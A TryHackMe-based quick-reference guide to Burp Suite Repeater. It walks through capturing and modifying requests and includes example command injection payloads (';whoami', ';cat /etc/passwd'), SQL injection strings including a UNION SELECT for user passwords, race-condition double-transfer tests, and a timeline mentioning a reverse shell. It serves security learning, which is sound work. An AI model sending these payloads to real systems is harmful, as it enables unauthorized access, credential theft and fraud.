# Burp Suite Repeater - Quick Reference Guide

**Date:** January 14, 2026  
**Source:** TryHackMe Lab Work  
**Purpose:** Quick reference for using Burp Suite Repeater to test vulnerabilities

---

## What is Burp Suite Repeater?

**Repeater** = A tool in Burp Suite that lets you:
- Capture HTTP requests
- Modify them manually
- Send them repeatedly
- Observe responses
- Test for vulnerabilities without reloading the page

**Why it's useful:**
- Testing command injection
- Testing SQL injection
- Fuzzing parameters
- Testing race conditions
- Analyzing request/response patterns

---

## Accessing Burp Repeater

### Method 1: From Proxy History
1. Open Burp Suite
2. Go to **Proxy** tab
3. Go to **HTTP history** subtab
4. Find interesting request
5. Right-click → **Send to Repeater**
6. Go to **Repeater** tab

### Method 2: Direct Access
1. Click **Repeater** tab at top
2. Manually paste request, or
3. Use from Proxy history (Method 1)

---

## Repeater Interface Breakdown

```
┌─────────────────────────────────────┐
│ Repeater Tab                        │
├─────────────────────────────────────┤
│ [Request] [Response] [Render]       │  ← Tabs
├─────────────────────────────────────┤
│ GET /ping?ip=8.8.8.8 HTTP/1.1       │  ← Request panel
│ Host: target.com                    │
│ User-Agent: Mozilla/5.0             │
│                                     │
│ [Send] [Forward to Repeater] [...]  │  ← Action buttons
├─────────────────────────────────────┤
│ HTTP/1.1 200 OK                     │  ← Response panel
│ Content-Type: text/plain            │
│                                     │
│ PING 8.8.8.8 (8.8.8.8) 56(84) bytes │
│ 64 bytes from 8.8.8.8: icmp_seq=1...│
└─────────────────────────────────────┘
```

---

## Basic Repeater Workflow

### Step 1: Capture Request
- Use Burp Proxy to intercept traffic
- Identify vulnerable parameter

### Step 2: Send to Repeater
- Right-click request → **Send to Repeater**
- Switch to Repeater tab

### Step 3: Modify Request
- Edit the request in the top panel
- Change parameters, headers, body
- Click **Send** button

### Step 4: Analyze Response
- View response in bottom panel
- Look for error messages, unusual output
- Modify and resend if needed

### Step 5: Repeat/Iterate
- Keep testing variations
- Track what works/doesn't work
- Document successful payloads

---

## Modifying Requests in Repeater

### Example 1: Command Injection Testing

**Original Request:**
```
GET /ping?ip=8.8.8.8 HTTP/1.1
Host: target.com
```

**Modify to inject command:**
```
GET /ping?ip=8.8.8.8;whoami HTTP/1.1
Host: target.com
```

**Click Send → Check response for "www-data" or similar**

### Example 2: SQL Injection Testing

**Original Request:**
```
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

query=product
```

**Modify to test SQL injection:**
```
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

query=product' OR '1'='1
```

**Click Send → Check response for unexpected data**

### Example 3: Header Modification

**Add/Modify headers:**
```
GET /admin HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGc...     ← Modified token
X-Forwarded-For: 127.0.0.1           ← Added header
```

---

## Race Condition Testing with Repeater

### Method 1: Manual Rapid Clicking
1. Prepare request in Repeater
2. Click **Send** repeatedly, fast
3. Look for inconsistent behavior

### Method 2: Burp Suite Pro - "Send group"
1. Prepare first request in Repeater
2. Click **Send group** button
3. Select how many times to send
4. Select **Send simultaneously**
5. Observe all responses

### Method 3: Tab Sending
1. Create request in Repeater tab 1
2. Create same request in Repeater tab 2
3. Tab back and forth, clicking Send
4. Watch for race condition behavior

**Example - Testing duplicate transaction:**
```
Tab 1: POST /transfer?amount=50&to=bob
Tab 2: POST /transfer?amount=50&to=bob

Click Send in Tab 1, immediately click Send in Tab 2
If race condition exists, both $50 transfers process ($100 deducted!)
```

---

## Advanced Repeater Features

### Inspector Panel
- Right-click request → **Show Inspector**
- Visually edit request parameters
- Easier than manual text editing

### Encoding/Decoding
- Highlight text in request
- Right-click → **Send to Decoder**
- Encode/decode payloads (URL encode, Base64, etc.)

**Example:**
```
Text: 8.8.8.8; whoami
URL Encoded: 8.8.8.8%3Bwhoami
```

### Copy as cURL
- Right-click request → **Copy as cURL**
- Paste into terminal for testing outside Burp

**Example:**
```bash
curl -X GET 'http://target.com/ping?ip=8.8.8.8%3Bwhoami' \
  -H 'Host: target.com' \
  -H 'User-Agent: Mozilla/5.0'
```

---

## Testing Workflow Examples

### Testing Command Injection

```
1. Original Request:
   GET /ping?ip=8.8.8.8

2. First modification (test separator `;`):
   GET /ping?ip=8.8.8.8;whoami
   Response: Shows username → VULNERABLE!

3. Escalate attack:
   GET /ping?ip=8.8.8.8;cat%20/etc/passwd
   Response: Shows password file → RCE confirmed!

4. Document payload:
   Payload: 8.8.8.8; cat /etc/passwd
   Separator: semicolon (;)
   Effect: Remote code execution as www-data
```

### Testing Race Condition

```
1. Normal Request:
   POST /withdraw?amount=50
   Response: Balance reduced by $50

2. Send twice simultaneously:
   Send Request in Tab 1 + Tab 2 at same time
   Response: Balance reduced by $100 (both processed!) → VULNERABLE!

3. Confirm with multiple requests:
   Send 5 identical requests simultaneously
   Response: Balance reduced by $250 (all 5 processed!)

4. Document:
   Vulnerability: Race condition in withdrawal logic
   Impact: User can withdraw more than account balance
```

### Testing SQL Injection

```
1. Original Request:
   POST /search
   query=apple

2. Test SQLi basic:
   query=apple' OR '1'='1
   Response: Returns all products → VULNERABLE!

3. Try data extraction:
   query=apple' UNION SELECT username, password FROM users WHERE '1'='1
   Response: Shows usernames and passwords!

4. Document:
   Vulnerability: SQL injection in search parameter
   Payload: ' UNION SELECT ...
   Impact: Database compromise
```

---

## Common Response Codes & Meanings

| Code | Meaning | What to Look For |
|------|---------|-----------------|
| 200 | OK | Normal successful response |
| 302/301 | Redirect | Check Location header |
| 400 | Bad Request | Syntax error in payload |
| 401 | Unauthorized | Need authentication |
| 403 | Forbidden | Access denied (might indicate privilege levels) |
| 404 | Not Found | Endpoint doesn't exist |
| 500 | Server Error | Application crashed (possible code execution!) |
| 503 | Service Unavailable | Server overloaded/down |

---

## Troubleshooting Repeater

### Issue: Request not sending
- **Check:** Burp not intercepting? Make browser proxy is set correctly
- **Fix:** Restart Burp, re-enable Proxy intercept

### Issue: Response appears blank
- **Check:** Click "Render" tab to see formatted HTML
- **Fix:** Some responses need rendering, some are raw text

### Issue: Can't modify certain parts of request
- **Check:** Is that part locked/protected?
- **Fix:** Check Repeater settings, ensure you're editing right section

### Issue: URL encoding issues
- **Check:** Special characters being double-encoded?
- **Fix:** Use Decoder to properly encode, paste raw into request

---

## Tips & Tricks

✅ **Keyboard shortcut:** Ctrl+Enter to send request quickly
✅ **Create multiple tabs:** Test variations side-by-side
✅ **Use comments:** Add // Comments in request to remember changes
✅ **Check both panels:** Response might show in "Response" AND "Render" differently
✅ **Inspect headers:** Often contains security headers (X-Frame-Options, etc.)
✅ **Watch for errors:** 500 errors often indicate code injection worked

---

## Real-World Repeater Session

```
Time 0:00 - Capture ping request in Proxy
Time 0:05 - Send to Repeater
Time 0:10 - Test: 8.8.8.8; whoami → SUCCESS!
Time 0:15 - Test: 8.8.8.8; id → Shows "www-data" user
Time 0:20 - Test: 8.8.8.8; cat /etc/passwd → SUCCESS!
Time 0:25 - Document: Command injection confirmed, RCE as www-data
Time 0:30 - Build reverse shell payload in Decoder
Time 0:35 - Send reverse shell via Repeater
Time 0:40 - Catch shell in netcat listener
Time 0:45 - Write up vulnerability with evidence
```

---

## Key Takeaways

✅ **Repeater** = Manual request modification & testing tool
✅ **Workflow** = Capture → Modify → Send → Analyze → Iterate
✅ **Race conditions** = Send simultaneously (manual or "Send group")
✅ **Encoding** = Use Decoder for URL encoding/special characters
✅ **Documentation** = Save working payloads for writeups
✅ **Response analysis** = Check both Response tab and Render tab

---

## Next Steps

- Practice modifying requests in Repeater
- Test various command injection separators
- Use for race condition testing
- Document all successful exploits for writeups

